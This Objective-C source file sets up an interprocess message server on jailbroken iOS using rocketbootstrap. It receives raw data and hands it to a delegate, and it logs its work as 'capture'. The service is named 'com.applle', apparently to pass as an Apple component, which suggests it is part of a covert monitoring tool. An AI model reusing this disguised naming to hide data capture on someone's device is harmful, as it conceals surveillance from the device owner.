//
//  DMCenterIPCReader.m
//  IPC
//
//  Created by Makara Khloth on 1/6/14.
//  Copyright 2014 Vervata. All rights reserved.
//

#import "DMCenterIPCReader.h"

#import "CPDistributedMessagingCenter.h"
#include "rocketbootstrap.h"

#import <objc/runtime.h>

@interface DMCenterIPCReader (private)
- (NSDictionary *) handleMessageNamed: (NSString *) aMessageNamed withUserInfo: (NSDictionary *) aUserInfo;
@end

@implementation DMCenterIPCReader

@synthesize mDelegate, mCenter;

- (id) initWithCenterName: (NSString *) aCenterName withDelegate: (id <DMCIPCDelegate>) aDelegate {
	if ((self = [super init])) {
		mCenterName = [[NSString alloc] initWithString:aCenterName];
		[self setMDelegate:aDelegate];
		
		Class $CPDistributedMessagingCenter = objc_getClass("CPDistributedMessagingCenter");
		CPDistributedMessagingCenter *center = [$CPDistributedMessagingCenter centerNamed:@"com.applle.distributedmessagingcenter"];
		DLog (@"Center com.applle.distributedmessagingcenter = %@, entitlements = %@", center, [center _requiredEntitlement])
		rocketbootstrap_distributedmessagingcenter_apply(center);
		DLog (@"Center bootstrap com.applle.distributedmessagingcenter = %@", center)
		[center runServerOnCurrentThread];
		[self setMCenter:center];
	}
	return (self);
}

- (void) start {
	DLog (@"Start capture msg.Center")
	Class $CPDistributedMessagingCenter = objc_getClass("CPDistributedMessagingCenter");
	CPDistributedMessagingCenter *center = [$CPDistributedMessagingCenter centerNamed:@"com.applle.distributedmessagingcenter"];
	DLog (@"Center com.applle.distributedmessagingcenter = %@, entitlements = %@", center, [center _requiredEntitlement])
	rocketbootstrap_distributedmessagingcenter_apply(center);
	DLog (@"Center bootstrap com.applle.distributedmessagingcenter = %@", center)
	[center runServerOnCurrentThread];
	[self setMCenter:center];
	
	[mCenter registerForMessageName:mCenterName
							 target:self
						   selector:@selector(handleMessageNamed:withUserInfo:)];
}

- (void) stop {
	DLog (@"Stop capture msg.Center")
	[mCenter unregisterForMessageName:mCenterName];
}

- (NSDictionary *) handleMessageNamed: (NSString *) aMessageNamed withUserInfo: (NSDictionary *) aUserInfo {
	DLog(@"aMessageNamed	= %@", aMessageNamed)
	DLog(@"aUserInfo		= %@", aUserInfo)
	
	NSData *rawData = [aUserInfo objectForKey:@"aRawData"];
	if ([mDelegate respondsToSelector:@selector(dataDidReceivedFromDMC:)]) {
		[mDelegate performSelector:@selector(dataDidReceivedFromDMC:) withObject:rawData];
	}
	return (nil);
}

- (void) dealloc {
	[mCenterName release];
	[mCenter release];
	[super dealloc];
}

@end
